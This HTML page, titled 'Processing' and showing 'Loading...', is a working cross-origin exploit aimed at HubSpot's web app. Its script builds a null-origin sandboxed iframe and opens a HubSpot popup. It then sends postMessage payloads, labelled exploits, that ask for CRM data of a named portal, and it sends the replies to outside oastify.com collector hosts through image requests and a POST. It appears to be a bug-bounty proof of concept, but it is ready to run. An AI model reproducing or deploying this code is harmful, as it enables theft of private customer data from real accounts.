<!DOCTYPE html>
<html>
<head><title>Processing</title></head>
<body>
<h1>Loading...</h1>
<div id="log"></div>
<script>
const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(m) {
    document.getElementById('log').innerHTML += '<br>' + m;
    new Image().src = E + '/?log=' + encodeURIComponent(m);
}

log('relay_loaded');

// CRITICAL: Remove 'allow-same-origin' to get NULL origin
const sandbox1 = document.createElement('iframe');
sandbox1.sandbox = 'allow-scripts allow-popups'; // NO allow-same-origin!
sandbox1.style.cssText = 'width:100%;height:400px;border:3px solid red';

sandbox1.srcdoc = `
<!DOCTYPE html>
<html>
<body>
<h3>Sandbox (Null Origin Attack)</h3>
<div id="s1" style="font-family:monospace;font-size:11px;"></div>
<script>
const E1 = 'https://br6v4frky5l1xsredqgblixfc6ix6oud.oastify.com';
function l1(m) {
    document.getElementById('s1').innerHTML += '<br>' + m;
    new Image().src = E1 + '/?s=' + encodeURIComponent(m);
}

l1('ORIGIN=' + window.origin);

// Open HubSpot - it will inherit NULL origin
l1('opening_hubspot');
let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');

if (!hub) {
    l1('ERROR_blocked');
} else {
    l1('popup_opened');
    
    let attempts = 0;
    let checker = setInterval(() => {
        attempts++;
        
        try {
            hub.origin;
            if (attempts % 20 === 0) l1('polling_' + attempts);
        } catch(e) {
            clearInterval(checker);
            l1('loaded_after_' + attempts);
            
            // Listen for responses
            window.addEventListener('message', function(resp) {
                if (resp.source === hub) {
                    l1('RESPONSE_FROM=' + resp.origin);
                    l1('RESPONSE_TYPE=' + (resp.data.type || 'unknown'));
                    
                    const data = JSON.stringify(resp.data);
                    new Image().src = E1 + '/?resp=' + encodeURIComponent(data.substring(0, 600));
                    
                    fetch(E1 + '/full', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: data
                    });
                }
            });
            
            // Send exploits
            setTimeout(() => {
                l1('SENDING_EXPLOIT_1');
                hub.postMessage({
                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                    commandId: 'getData',
                    featureId: 'crm',
                    parameters: {portalId: '46962361'},
                    resultCount: 100,
                    language: 'en',
                    objectId: '46962361',
                    applicationId: 'crm',
                    basePath: '/crm',
                    maxPollingAttempts: 5,
                    pollingInterval: 200
                }, '*');
            }, 1000);
            
            setTimeout(() => {
                l1('SENDING_EXPLOIT_2');
                hub.postMessage({
                    type: 'raw',
                    _callbackId: 'x' + Date.now(),
                    body: {
                        action: 'getData',
                        portalId: '46962361'
                    }
                }, '*');
            }, 2000);
            
            setTimeout(() => {
                l1('SENDING_EXPLOIT_3');
                hub.postMessage({
                    type: 'TOGGLE_DARK_MODE',
                    isDarkMode: true
                }, '*');
            }, 3000);
        }
        
        if (attempts > 150) {
            clearInterval(checker);
            l1('timeout');
        }
    }, 100);
}
`;

document.body.appendChild(sandbox1);
log('sandbox_created');

if (window.opener) {
    window.opener.postMessage({status: 'ready'}, '*');
}
</script>
</body>
</html>
